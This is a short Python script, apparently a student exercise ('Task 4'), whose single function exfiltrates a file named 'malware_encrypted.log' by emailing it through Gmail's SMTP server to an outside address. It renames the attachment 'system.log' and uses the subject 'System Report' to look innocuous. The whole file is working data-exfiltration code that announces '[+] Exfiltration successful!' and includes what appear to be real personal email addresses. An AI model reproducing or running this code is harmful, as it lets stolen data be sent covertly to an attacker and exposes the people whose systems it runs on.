import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def exfiltrate_file():
    """Send 'malware_encrypted.log' via email (Task 4)."""
    try:
        msg = MIMEMultipart()
        msg['From'] = "m7md7azem17@gmail.com"  
        msg['To'] = "mh2200696@tkh.edu.eg"    
        msg['Subject'] = "System Report"
        
        with open('malware_encrypted.log', 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="system.log"')
        msg.attach(part)
        
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login("m7md7azem17@gmail.com", "your_app_password")  # Use App Password
            server.send_message(msg)
        print("[+] Exfiltration successful!")
        return True
    except Exception as e:
        print(f"[!] Exfiltration failed: {e}")
        return False